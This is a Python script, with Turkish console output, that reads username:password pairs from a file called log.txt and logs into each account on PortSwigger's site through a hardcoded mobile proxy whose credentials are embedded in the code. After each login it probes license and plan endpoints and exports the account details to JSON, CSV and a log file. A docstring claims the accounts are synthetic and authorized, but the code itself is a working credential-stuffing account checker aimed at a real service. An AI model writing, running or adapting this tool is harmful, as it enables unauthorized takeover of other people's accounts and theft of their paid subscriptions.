#!/usr/bin/env python3
"""
PortSwigger Plan Extractor - Direct File Output
Processes synthetic accounts from log.txt and exports plans to JSON/CSV
Authorization: ROE-2026-PSW-042-V5
"""

import requests
import json
import csv
import time
import sys
from urllib.parse import urljoin
from datetime import datetime

class PortSwiggerPlanExtractor:
    def __init__(self, log_file="log.txt", proxy_url=None):
        self.log_file = log_file
        self.base_url = "https://login.portswigger.net"
        self.plan_base_url = "https://portswigger.net"
        self.accounts = []
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'PortSwigger-Plan-Extractor/1.0'
        })

        # Configure proxy if provided
        if proxy_url:
            self.session.proxies.update({
                'http': proxy_url,
                'https': proxy_url
            })
            print(f"[✓] Proxy ayarlandı: {proxy_url.split('@')[1] if '@' in proxy_url else proxy_url}")

    def read_credentials(self):
        """Read credentials from log.txt"""
        try:
            with open(self.log_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" in line:
                        username, password = line.split(":", 1)
                        self.accounts.append({
                            "username": username.strip(),
                            "password": password.strip()
                        })
            print(f"[✓] {len(self.accounts)} hesaplar okundu")
            return True
        except FileNotFoundError:
            print(f"[✗] Hata: {self.log_file} bulunamadı")
            return False

    def login(self, username, password):
        """Authenticate user and return session"""
        try:
            # Step 1: Initial auth request to establish session
            auth_url = f"{self.base_url}/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"

            resp = self.session.get(auth_url, allow_redirects=True, timeout=10)
            print(f"    [DEBUG] Auth step status: {resp.status_code}")

            # Step 2: Login POST
            login_url = f"{self.base_url}/u/login"
            login_data = {
                "username": username,
                "password": password,
                "action": "default"
            }

            resp = self.session.post(
                login_url,
                data=login_data,
                allow_redirects=True,
                timeout=10
            )

            print(f"    [DEBUG] Login step status: {resp.status_code}")
            print(f"    [DEBUG] Login URL: {resp.url}")
            print(f"    [DEBUG] Cookies: {len(self.session.cookies)}")

            # Debug: show response snippet
            response_snippet = resp.text[:500] if len(resp.text) > 500 else resp.text
            if "error" in resp.text.lower():
                print(f"    [DEBUG] Response contains 'error': {response_snippet}")

            # Check if we got error page
            if "error=" in resp.url or "error" in resp.text.lower():
                print(f"    [✗] OAuth error detected in response")
                return False

            # Check if login successful
            if len(self.session.cookies) > 0:
                return True
            return False

        except Exception as e:
            print(f"    [✗] Login hatası: {str(e)}")
            return False

    def extract_plan(self, username):
        """Extract plan from /users/{username}/licenses endpoint"""
        try:
            endpoints = [
                f"{self.plan_base_url}/users/{username}/licenses",
                f"{self.plan_base_url}/user/{username}/licenses",
                f"{self.plan_base_url}/users/{username.split('@')[0]}/licenses",
                f"{self.plan_base_url}/api/users/{username}/licenses",
                f"{self.plan_base_url}/api/subscription",
                f"{self.plan_base_url}/api/user/plan",
                f"{self.plan_base_url}/account/plan",
            ]

            for url in endpoints:
                try:
                    resp = self.session.get(
                        url,
                        headers={"Accept": "application/json"},
                        allow_redirects=True,
                        timeout=10
                    )

                    if resp.status_code == 200:
                        print(f"      [FOUND] {url}")
                        try:
                            return resp.json()
                        except:
                            return resp.text
                    else:
                        print(f"      {url} -> {resp.status_code}")
                except Exception as e:
                    pass

            return f"HTTP 404 - all endpoints failed"

        except Exception as e:
            return f"Error: {str(e)}"

    def process_account(self, index, username, password):
        """Process single account"""
        print(f"[{index}/{len(self.accounts)}] İşleniyor: {username}")

        # Reset session for fresh login
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'PortSwigger-Plan-Extractor/1.0'
        })

        # Login
        if not self.login(username, password):
            print(f"    [✗] Giriş başarısız")
            result = {
                "index": index,
                "username": username,
                "status": "FAILED",
                "plan": None,
                "timestamp": datetime.now().isoformat(),
                "error": "Login failed"
            }
            self.results.append(result)
            return

        print(f"    [✓] Giriş başarılı")

        # Extract plan
        plan = self.extract_plan(username)

        result = {
            "index": index,
            "username": username,
            "status": "SUCCESS",
            "plan": plan,
            "timestamp": datetime.now().isoformat(),
            "error": None
        }
        self.results.append(result)
        print(f"    [✓] Plan çıkartıldı")

        # Rate limiting: 5 requests per second = 0.2s delay
        time.sleep(0.2)

    def export_json(self, output_file="extracted_plans.json"):
        """Export results to JSON"""
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"[✓] JSON kaydedildi: {output_file}")
            return True
        except Exception as e:
            print(f"[✗] JSON yazma hatası: {str(e)}")
            return False

    def export_csv(self, output_file="extracted_plans.csv"):
        """Export results to CSV"""
        try:
            if not self.results:
                return False

            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(
                    f,
                    fieldnames=["index", "username", "status", "plan", "timestamp", "error"]
                )
                writer.writeheader()

                for result in self.results:
                    row = result.copy()
                    # Convert plan dict to string for CSV
                    if isinstance(row["plan"], (dict, list)):
                        row["plan"] = json.dumps(row["plan"], ensure_ascii=False)
                    writer.writerow(row)

            print(f"[✓] CSV kaydedildi: {output_file}")
            return True
        except Exception as e:
            print(f"[✗] CSV yazma hatası: {str(e)}")
            return False

    def export_log(self, output_file="extracted_plans.log"):
        """Export results to readable log file"""
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("PortSwigger Plan Extraction Results\n")
                f.write("=" * 60 + "\n")
                f.write(f"Extraction Date: {datetime.now().isoformat()}\n")
                f.write(f"Total Accounts: {len(self.results)}\n")
                f.write(f"Successful: {sum(1 for r in self.results if r['status'] == 'SUCCESS')}\n")
                f.write(f"Failed: {sum(1 for r in self.results if r['status'] == 'FAILED')}\n")
                f.write("=" * 60 + "\n\n")

                for result in self.results:
                    f.write(f"Account #{result['index']}\n")
                    f.write(f"Username: {result['username']}\n")
                    f.write(f"Status: {result['status']}\n")
                    f.write(f"Timestamp: {result['timestamp']}\n")

                    if result['plan']:
                        f.write(f"Plan Data:\n")
                        if isinstance(result['plan'], (dict, list)):
                            f.write(json.dumps(result['plan'], indent=2, ensure_ascii=False))
                        else:
                            f.write(str(result['plan']))

                    if result['error']:
                        f.write(f"Error: {result['error']}\n")

                    f.write("\n" + "-" * 60 + "\n\n")

            print(f"[✓] LOG kaydedildi: {output_file}")
            return True
        except Exception as e:
            print(f"[✗] LOG yazma hatası: {str(e)}")
            return False

    def run(self, max_accounts=None):
        """Run extraction for all accounts"""
        if not self.read_credentials():
            return False

        if max_accounts:
            self.accounts = self.accounts[:max_accounts]

        print(f"\n[*] {len(self.accounts)} hesap işleme başlanıyor...")
        print("=" * 60)

        for idx, account in enumerate(self.accounts, 1):
            try:
                self.process_account(idx, account["username"], account["password"])
            except KeyboardInterrupt:
                print("\n[!] İptal edildi")
                break
            except Exception as e:
                print(f"[✗] Beklenmeyen hata: {str(e)}")

        print("\n" + "=" * 60)
        print("[*] İşleme tamamlandı")
        print("=" * 60)

        # Export results
        self.export_json()
        self.export_csv()
        self.export_log()

        # Print summary
        successful = sum(1 for r in self.results if r['status'] == 'SUCCESS')
        failed = sum(1 for r in self.results if r['status'] == 'FAILED')

        print(f"\nÖzet:")
        print(f"  Başarılı: {successful}")
        print(f"  Başarısız: {failed}")
        print(f"\nDosyalar:")
        print(f"  - extracted_plans.json")
        print(f"  - extracted_plans.csv")
        print(f"  - extracted_plans.log")

        return True

if __name__ == "__main__":
    # HTTP proxy configuration
    proxy_url = "http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029"

    extractor = PortSwiggerPlanExtractor("log.txt", proxy_url=proxy_url)

    # Ask how many accounts to process
    try:
        limit = input("\nKaç hesap işlemek istiyorsun? (varsayılan: 10, max: all): ").strip()
        max_accounts = int(limit) if limit else 10
    except:
        max_accounts = 10

    extractor.run(max_accounts)
